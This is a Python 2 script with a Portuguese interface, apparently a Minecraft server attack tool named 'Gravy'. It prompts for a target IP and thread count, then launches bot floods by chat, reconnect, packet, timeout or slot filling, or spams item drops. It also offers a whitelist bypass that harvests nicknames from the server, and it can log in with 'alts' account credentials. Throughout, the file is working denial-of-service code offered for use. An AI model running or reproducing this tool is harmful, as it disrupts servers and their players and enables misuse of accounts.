from SyncPrint import *
import gravylib, socks, time, random, threading, string, ProxyManager, sys, binascii, time
print '--==[ Gravy ]==--'
print
print 'Versoes suportadas:'
print '[0] 1.5.2'				
print '[1] 1.6.1'				
print '[2] 1.6.2'				
print '[3] 1.6.4'			
print '[4] 1.7.2 -> 1.7.5'		
print '[5] 1.7.6 -> 1.7.10'		
print '[6] 1.8 -> 1.8.9'		
print '[7] 1.9'					
print '[8] 1.9.1'				
print '[9] 1.9.2'				
print '[10] 1.9.3 -> 1.9.4'		
print '[11] 1.10 -> 1.10.2'		
print '[12] 1.11'				
print '[13] 1.11.1 -> 1.11.2'
print '[14] 1.12'			
print '[15] 1.12.1'			
print '[16] 1.12.2'			
print '[17] 1.13'				
print '[18] 1.13.1'			
print '[19] 1.13.2'			
print '[20] 1.14'			
print '[21] 1.14.1'		
print '[22] 1.14.2'			
print '[23] 1.14.3'			
print '[24] 1.14.4'	
print '[25] 1.15'
print '[26] 1.15.1'
print '[27] 1.15.2'
print
proto = input('Selecione uma versao: ')

if proto == 0:
    protonum = 61
elif proto == 1:
    protonum = 73
	
elif proto == 2:
    protonum = 74
	
elif proto == 3:
    protonum = 78
	
elif proto == 4:
    protonum = 4
	
elif proto == 5:
    protonum = 5
	
elif proto == 6:
	protonum = 47
	
elif proto == 7:
	protonum = 107
	
elif proto == 8:
	protonum = 108
	
elif proto == 9:
	protonum = 109
	
elif proto == 10:
	protonum = 110
	
elif proto == 11:
	protonum = 210
	
elif proto == 12:
	protonum = 315
	
elif proto == 13:
	protonum = 316
	
elif proto == 14:
	protonum = 335
	
elif proto == 15:
	protonum = 338

elif proto == 16:
	protonum = 340

elif proto == 17:
	protonum = 393

elif proto == 18:
	protonum = 401

elif proto == 19:
	protonum = 404

elif proto == 20:
	protonum = 447

elif proto == 21:
	protonum = 480

elif proto == 22:
	protonum = 485

elif proto == 23:
	protonum = 490

elif proto == 24:
	protonum = 498

elif proto == 25:
    protonum = 573

elif proto == 26:
    protonum = 575

elif proto == 27:
    protonum = 578
else:
    synckill('\n[!] Opcao invalida!')

target = raw_input('IP: ')
threads = input('Quantidade de threads: ')
pCount = 2
singleMessage = False
print
print '[i] Tipo de Ataque.'
print
print '[1] Dropar itens no Criativo (Precisa ter uma conta criativo)'
print '[2] Floodar chat'
print '[3] Reconectar (Flodar de menssagens de connect e disconnect'
print '[4] Flodar pacotes (Ignora o aviso de conexao rapida e tenta reconectar)'
print '[5] Fazer Flood de TimedOut'
print '[6] Encher todos os slots do servidor (threads precisam ser >= que slots)'
print
optionatt = input('Selecione uma Opcao de ataque: ')
if optionatt == 1:
    creativeDrop = True
    chatFlood = False
    reconnectFlood = False
    packetFlood = False
    timeout = False
    prependFlood = ''
    staticFloodMessage = ''
    authFlood = False
if optionatt == 2:
    creativeDrop = False
    chatFlood = True
    staticFloodMessage = raw_input('Static Flood message. If = , randomness: ')
    prependFlood = ''
    reconnectFlood = False
    packetFlood = False
    timeout = False
    authFlood = False
if optionatt == 3:
    creativeDrop = False
    chatFlood = False
    reconnectFlood = True
    packetFlood = False
    timeout = False
    prependFlood = ''
    staticFloodMessage = ''
    authFlood = False
if optionatt == 4:
    creativeDrop = False
    chatFlood = False
    reconnectFlood = False
    packetFlood = True
    timeout = False
    prependFlood = ''
    staticFloodMessage = ''
    authFlood = False
if optionatt == 5:
    creativeDrop = False
    chatFlood = False
    reconnectFlood = False
    packetFlood = False
    timeout = True
    prependFlood = ''
    staticFloodMessage = ''
    authFlood = False
if optionatt == 6:
    creativeDrop = False
    chatFlood = False
    reconnectFlood = False
    packetFlood = False
    timeout = False
    prependFlood = ''
    staticFloodMessage = ''
    authFlood = False

print
print '[i] Opcoes de nick'
print
print '[1] Alts, para ataque em servidores premium. (Formato: user:pass   Aquivo: alts.txt)'
print '[2] Nicks Randomicos'
print '[3] Usar uma lista de nicks (Arquivo: nicks.txt)'
print '[4] Nick estatico (Apenas 1 nick)'
print '[5] Burlar Whitelist'
print
optionick = input('Selecione uma opcao de nick: ')
if optionick == 1:
    nickMode = 'alts'
    masterNick = ''
if optionick == 2:
    nickMode = 'random'
    option2 = raw_input('Voce quer usar um prefixo?(s/n): ')
    if option2 == 's':
        prepend = raw_input('Insira o prefixo: ')
    if option2 == 'n':
        prepend = ''
    masterNick = ''
if optionick == 3:
    nickMode = 'nicklist'
    masterNick = ''
if optionick == 4:
    nickMode = 'static'
    staticNick = raw_input('Insira o nick: ')
    masterNick = ''
if optionick == 5:
    nickMode = 'no'
    masterNick = raw_input('Insira um nick que esta na Whitelist: ')
canReconnect = False
skipNicks = [masterNick]

def parse_ip(target, default = 25565):
    srv = target.replace('\n', '').split(':')
    if len(srv) == 1:
        prt = default
    else:
        prt = int(srv[1])
    return {'ip': srv[0],
     'port': prt}


target = parse_ip(target)
thhreads = list()
nicks = [masterNick]
if nickMode == 'alts':
    nicks = open('alts.txt').readlines()
elif nickMode == 'nicklist':
    nicks = open('nicks.txt').readlines()
elif nickMode == 'bypass':
    fl = open(target['ip'] + '.nickpool.txt', 'a+', 0)
    nicks = fl.readlines()
    syncprint('Carregando ByPass da Whitelist!')

    def event(id, object):
        if id == '\xc9':
            name = object._readString().replace('\xa7f', '')
            isOnline = object._getBytes(1)
            ping = object._getBytes(2)
            if name in skipNicks:
                return True
            if name in nicks:
                return True
            object._log('Adding ' + name)
            nicks.append(name)
            jobs.append((name.replace('\n', ''), ''))
            fl.write(name + '\n')
            return True
        return False


    def eventHook():
        while True:
            x = time.time()
            gravylib.CraftPlayer(masterNick, password='', proxy='', server=(target['ip'], int(target['port'])), eventHook=event, debug=False)._connect()
            while time.time() - x <= 4:
                time.sleep(1)

            print '-> Reconectando'

        return


    th = threading.Thread(target=eventHook)
    th.daemon = True
    thhreads.append(th)
    th.start()
elif nickMode == 'static':
    nicks = list()
    for x in xrange(1, 50):
        nicks.append(staticNick)

actions = []
if creativeDrop == True:
    actions.append('creativeDrop')
if chatFlood == True:
    actions.append('chatFlood')
if reconnectFlood == True:
    actions.append('reconnectFlood')
if packetFlood == True:
    actions.append('pFlood')
if singleMessage == True:
    actions.append('sM')
if timeout == True:
    actions.append('tO')
if authFlood == True:
    actions.append('authFlood')
syncprint('======== Gravy 1.0 ========')
syncprint('')
syncprint('[i] Starting...')
syncprint('')
jobs = list()
lk = threading.Lock()

def cbck(x, y):
    try:
        jobs.remove((y._nickname, y._password))
    except:
        pass

    print 'callback'


def ThreadEntry():
    with lk:
        pass
    while True:
        try:
            if nickMode == 'random':
                job = (prepend + ''.join((random.choice(string.letters + string.digits) for x in range(random.randint(6 - len(prepend), 15 - len(prepend))))), '')
            else:
                with lk:
                    job = jobs.pop(0)
                    jobs.append(job)
            nickname, password = job
            gravylib.CraftPlayer(nickname, password=password, protonum=protonum ,proxy='', server=(target['ip'], int(target['port'])), attacks=actions, prependFlood=prependFlood, msg=staticFloodMessage, debug=False, printchat=False, count=pCount, callback=cbck)._connect()
        except:
            pass
        #break


for nickname in nicks:
    password = ''
    if nickMode == 'alts':
        nickname, password = nickname.replace('\n', '').split(':')
    jobs.append((nickname.replace('\n', ''), password))

print 'Loading threads..'
with lk:
    for x in xrange(threads):
        th = threading.Thread(target=ThreadEntry)
        th.daemon = True
        thhreads.append(th)
        th.start()

print 'Running!'
try:
    while True:
        time.sleep(1000)

except (KeyboardInterrupt, SystemExit):
    synckill('\nReceived keyboard interrupt, quitting!')
